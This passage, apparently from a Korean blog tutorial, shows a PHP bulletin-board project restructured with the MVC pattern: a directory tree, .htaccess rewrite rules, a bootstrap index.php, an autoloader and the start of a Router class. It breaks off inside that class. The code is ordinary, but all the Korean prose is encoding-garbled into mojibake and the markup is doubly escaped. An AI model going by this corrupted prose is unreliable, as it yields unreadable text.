                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

..... ìƒëµ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[ììœ  ê²Œì‹œíŒ]&lt;/p&gt;

&lt;p&gt;ë‘ ê°œì˜ ê²Œì‹œíŒ â€œQnAâ€ì™€ â€œììœ  ê²Œì‹œíŒâ€ë¥¼ ë³´ë©´ ì¿¼ë¦¬ë¬¸ê³¼ ë¡œì§ì´ ëŒ€ë¶€ë¶„ ë¹„ìŠ·í•˜ë©° ì¿¼ë¦¬ ê°™ì€ ê²½ìš°ëŠ” í…Œì´ë¸” ëª…ì´ ë‹¤ë¥´ê³  ê·¸ ì™¸ ì¹¼ëŸ¼ ê°œìˆ˜ ë“± ì¤‘ì²©ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ë§Œì•½ ê²Œì‹œíŒì˜ ì¹¼ëŸ¼ì´ ê°ì í•˜ë‚˜ì”© ì¶”ê°€ëœë‹¤ë©´ ê²Œì‹œíŒ ì¢…ë¥˜ë³„ php 3ê°œì˜ ì½”ë“œë¥¼ í•˜ë‚˜ì”© ë³µì¡í•˜ê²Œ ìˆ˜ì •ì„ í•´ì¤˜ì•¼ í•˜ëŠ” ë‹¨ì ì´ ìˆë‹¤. í•˜ì§€ë§Œ MVC ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ìœ„ì™€ ê°™ì€ ë¶ˆí¸í•œ ì ì„ í•´ê²°í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;mvc-pattern---ì ìš©-í›„-&quot;&gt;[MVC Pattern - ì ìš© í›„ ]&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dong0701.png&quot; alt=&quot;/assets/dong0701.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MVC íŒ¨í„´ì´ ì ìš©ëœ PHPì´ë©° Web Root Directoryì— ì„¤ì¹˜ë  êµ¬ì¡°ì´ë©°, ì•„ë˜ì— tree êµ¬ì¡°ë¡œ ì „ì²´ë¥¼ ë‚˜ì—´í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
â”œâ”€â”€ DB.sql
â”œâ”€â”€ READEME.md
â”œâ”€â”€ application
â”‚Â Â  â”œâ”€â”€ &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;controller&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ board.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ core.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ main.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ new_test.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ profile.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ route.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ sign.php
â”‚Â Â  â”‚Â Â  â””â”€â”€ &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
â”‚Â Â  â”‚Â Â      â”œâ”€â”€ test.php
â”‚Â Â  â”‚Â Â      â””â”€â”€ test2.php
â”‚Â Â  â”œâ”€â”€ &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;lib&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ autoload.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ config.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ db_pdo.php
â”‚Â Â  â”‚Â Â  â””â”€â”€ init.php
â”‚Â Â  â”œâ”€â”€ &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;model&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ alert.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ boards.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ login.php
â”‚Â Â  â”‚Â Â  â”œâ”€â”€ model
â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ aaa.php
â”‚Â Â  â”‚Â Â  â””â”€â”€ mypage.php
â”‚Â Â  â””â”€â”€ &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;view&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
â”‚Â Â      â”œâ”€â”€ _template
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ footer.php
â”‚Â Â      â”‚Â Â  â””â”€â”€ head.php
â”‚Â Â      â”œâ”€â”€ board
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ bob_board
â”‚Â Â      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bob_board.php
â”‚Â Â      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bob_board_edit.php
â”‚Â Â      â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bob_board_read.php
â”‚Â Â      â”‚Â Â  â”‚Â Â  â””â”€â”€ bob_board_write.php
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ free_board.php
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ free_board_edit.php
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ free_board_read.php
â”‚Â Â      â”‚Â Â  â””â”€â”€ free_board_write.php
â”‚Â Â      â”œâ”€â”€ main
â”‚Â Â      â”‚Â Â  â””â”€â”€ main.php
â”‚Â Â      â”œâ”€â”€ profile
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ profile.php
â”‚Â Â      â”‚Â Â  â””â”€â”€ profile_edit.php
â”‚Â Â      â””â”€â”€ sign
â”‚Â Â          â”œâ”€â”€ signin.php
â”‚Â Â          â””â”€â”€ signup.php
â””â”€â”€ public
    â”œâ”€â”€ index.php
    â”œâ”€â”€ raon
    â”‚Â Â  â””â”€â”€ index.php
    â”œâ”€â”€ robots.txt
    â”œâ”€â”€ static
    â”‚Â Â  â”œâ”€â”€ css
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ argon-design-system.css
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ font-awesome.css
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ nucleo-icons.css
    â”‚Â Â  â”‚Â Â  â””â”€â”€ nucleo-svg.css
    â”‚Â Â  â”œâ”€â”€ fonts
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ FontAwesome.otf
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontawesome-webfont.eot
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontawesome-webfont.svg
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontawesome-webfont.ttf
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontawesome-webfont.woff
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ fontawesome-webfont.woff2
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ nucleo-icons.eot
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ nucleo-icons.svg
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ nucleo-icons.ttf
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ nucleo-icons.woff
    â”‚Â Â  â”‚Â Â  â””â”€â”€ nucleo-icons.woff2
    â”‚Â Â  â”œâ”€â”€ img
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ brand
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ blue.png
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ profile
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ mohamed.jpg
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ no-profile.jpeg
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ í”„ë¡œí•„.jpeg
    â”‚Â Â  â”‚Â Â  â””â”€â”€ raon.png
    â”‚Â Â  â”œâ”€â”€ index.php
    â”‚Â Â  â”œâ”€â”€ js
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ argon-design-system.min.js
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ core
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ bootstrap.min.js
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ jquery.min.js
    â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ popper.min.js
    â”‚Â Â  â”‚Â Â  â”œâ”€â”€ notify.js
    â”‚Â Â  â”‚Â Â  â””â”€â”€ plugins
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ bootstrap-datepicker.min.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ bootstrap-switch.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ chartjs.min.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ datetimepicker.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ jquery.sharrre.min.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ moment.min.js
    â”‚Â Â  â”‚Â Â      â”œâ”€â”€ nouislider.min.js
    â”‚Â Â  â”‚Â Â      â””â”€â”€ perfect-scrollbar.jquery.min.js
    â”‚Â Â  â”œâ”€â”€ test.html
    â”‚Â Â  â””â”€â”€ test.js
    â””â”€â”€ upload
        â”œâ”€â”€ bob_board
        â”œâ”€â”€ free_board
        â””â”€â”€ profile

28 directories, 74 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ ë””ë ‰í„°ë¦¬ êµ¬ì¡°ë¥¼ ë³´ë©´ ë¹¨ê°„ìƒ‰ìœ¼ë¡œ í‘œì‹œëœ ë¶€ë¶„ì´ MVC íŒ¨í„´ëŒ€ë¡œ ë¶„ë¦¬ëœ ì˜ì—­ì´ë©°, â€œlibâ€ ë””ë ‰í† ë¦¬ì—ëŠ” ì „ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì„¤ì • ê°’ì´ ë“¤ì–´ ìˆë„ë¡ í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì˜ˆë¥¼ ë“¤ì–´ DB Connect info ë˜ëŠ” Web Route ì„¤ì • ê°’ì´ ë“¤ì–´ ìˆë„ë¡ í•˜ì˜€ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;mvc-pattern---ì ìš©-í›„-ì½”ë“œ-&quot;&gt;[MVC Pattern - ì ìš© í›„ (ì½”ë“œ) ]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RewriteEngine On
RewriteRule ^&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;public/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L]
RewriteRule ^&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;public/&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L,QSA]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[/.&lt;strong&gt;htaccess&lt;/strong&gt;]&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Options &lt;span class=&quot;nt&quot;&gt;-Multiviews&lt;/span&gt;
RewriteEngine On

RewriteCond %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;REQUEST_URI&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!(&lt;/span&gt;raon|upload|static|css&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
RewriteCond %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;REQUEST_URI&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;css|&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;js|&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;png|&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;jpg|&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;gif|robots&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;txt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;NC]

RewriteCond %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;REQUEST_FILENAME&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OR]
RewriteCond %&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;REQUEST_FILENAME&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;OR]

RewriteRule ^&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;index.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;QSA,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[&lt;strong&gt;/public/.htaccess&lt;/strong&gt;]&lt;/p&gt;

&lt;p&gt;MVC íŒ¨í„´ì—ì„œëŠ” ëŒ€ë¶€ë¶„ Apache ê²½ìš° rewriteë¥¼ ì‚¬ìš©í•˜ì—¬ URLì— ë§ê²Œ rewriteë¥¼ ì§„í–‰í•˜ë„ë¡ htaccessë¥¼ ì‚¬ìš©í•œë‹¤. í•´ë‹¹ ë¬¸ë²•ì„ ì˜ˆì‹œë¡œ ì„¤ëª…í•˜ìë©´  **http://&lt;IP&gt;/main**ìœ¼ë¡œ ì ‘ì† ì‹œ rewrite ëª¨ë“ˆì—ì„œ &quot;**/public/index.php?url=main**&quot;ìœ¼ë¡œ ë³€í™˜ë˜ì–´ ì ‘ì†ëœë‹¤.&lt;/IP&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOCUMENT_ROOT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/application/lib/config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOCUMENT_ROOT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/application/lib/autoload.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DOCUMENT_ROOT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/application/lib/db_pdo.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOCUMENT_ROOT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/application/controller/route.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOCUMENT_ROOT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/application/lib/init.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[/public/index.php]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ index í˜ì´ì§€ëŠ” requireë¥¼ ì‚¬ìš©í•˜ì—¬ MVC íŒ¨í„´ì´ ì ìš©ëœ ì½”ë“œ ë˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¶ˆëŸ¬ì˜¤ë„ë¡ ì‘ì„±í•˜ì˜€ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;spl_autoload_register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    
    &lt;span class=&quot;nv&quot;&gt;$allow_class_dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;controller/&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* test/test2 */&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// echo '&amp;lt;h3&amp;gt;class path : '. $className.'&amp;lt;/h3&amp;gt;';&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$allow_class_dir&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/../&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/../&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Can not load class : '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$className&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[/&lt;strong&gt;application/lib/autoload.php&lt;/strong&gt;]&lt;/p&gt;

&lt;p&gt;spl_autoload_register í•¨ìˆ˜ëŠ” (PHP 5 &amp;gt;= 5.1.0, PHP 7)ì´ìƒ ë²„ì „ì—ì„œ ì§€ì›í•˜ë©°, ì—­í• ì€ ì¸ìë¡œ ì „ë‹¬ë°›ì€ íŒŒì¼ëª…ì† í´ë˜ìŠ¤ëŠ” ìë™ìœ¼ë¡œ ë¶ˆëŸ¬ì™€ ì£¼ëŠ” ì—­í• ì„ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì¦‰, &lt;strong&gt;/application/controller/&lt;/strong&gt;ì˜ ì¡´ì¬í•˜ëŠ” â€œ&lt;strong&gt;board.phpâ€&lt;/strong&gt;, â€œ&lt;strong&gt;core.php&lt;/strong&gt;â€, â€œ&lt;strong&gt;main.php&lt;/strong&gt;â€, â€œ&lt;strong&gt;profile.php&lt;/strong&gt;â€ ë“± í•´ë‹¹ ë””ë ‰í„°ë¦¬ì— ì¡´ì¬í•˜ëŠ” php íŒŒì¼ ì† í´ë˜ìŠ¤ëŠ” ì „ë¶€ ê°€ì ¸ì™€ ë¡œë“œ í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Router&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$_request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$_routes&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;$_default_page&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ìƒì„±ì */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request_uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_URI&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_request&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ì†Œë©¸ì */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
